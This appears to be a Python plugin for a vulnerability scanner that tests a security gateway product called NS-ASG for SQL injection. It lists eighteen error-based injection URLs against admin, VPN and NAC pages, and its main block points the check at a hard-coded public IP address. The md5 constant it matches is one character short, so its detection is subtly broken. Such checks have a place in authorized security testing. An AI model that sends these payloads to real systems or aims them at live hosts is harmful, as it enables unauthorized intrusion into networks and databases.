#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-ASG SQL Injection
author: yichin
refer:
    0day
    http://www.wooyun.org/bugs/wooyun-2014-058932
    http://www.wooyun.org/bugs/wooyun-2014-058971
    http://www.wooyun.org/bugs/wooyun-2014-058988
    http://www.wooyun.org/bugs/wooyun-2014-077810
description:
    能不能突破40上限啊,,,
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    #报错注入
    payloads = [
        arg + 'admin/config_Anticrack.php?GroupId=222%20and%201=(updatexml(1,concat(0x5e24,(select%20md5(1)),0x5e24),1))--a',
        arg + 'admin/config_ISCGroupNoCache.php?GroupId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'admin/config_ISCGroupSSLCert.php?GroupId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'admin/config_ISCGroupTimePolicy.php?GroupId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'admin/export_excel_user.php?GroupId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'admin/singlelogin.php?submit=1&loginId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'nac/naccheck.php?username=test%2527%20and%201=extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
        arg + 'admin/list_ipAddressPolicy.php?GroupId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'WebPages/history.php?uid=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
        arg + 'vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x23,%20(select%20md5(1))))',
        arg + 'WebPages/applyhardware.php?action=applyhardware&hard_user=test%2527%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
        arg + 'WebPages/singlelogin.php?loginId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23&submit=t',
        arg + 'admin/add_getlogin.php?SingleLoginId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
        arg + 'admin/add_postlogin.php?SingleLoginId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
        arg + 'admin/count_host.php?search=test\'%0aand%0aextractvalue(0x1,concat(0x23,md5(1)))%0aor\'%0a&action=find&begintime=%20\'ttest%20--%20%20t',
        arg + 'admin/add_ikev2.php?TunnelId=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))%23',
        arg + 'admin/configguide/ipsec_guide_1.php?TunnelId=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))%23',
        arg + 'vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x23,md5(1)),1))%23',
    ]
    md5_1 = 'c4ca4238a0b923820dcc509a6f75849'
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and md5_1 in res:
            security_hole('SQL injection: ' + payload)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://121.28.81.124/')[1])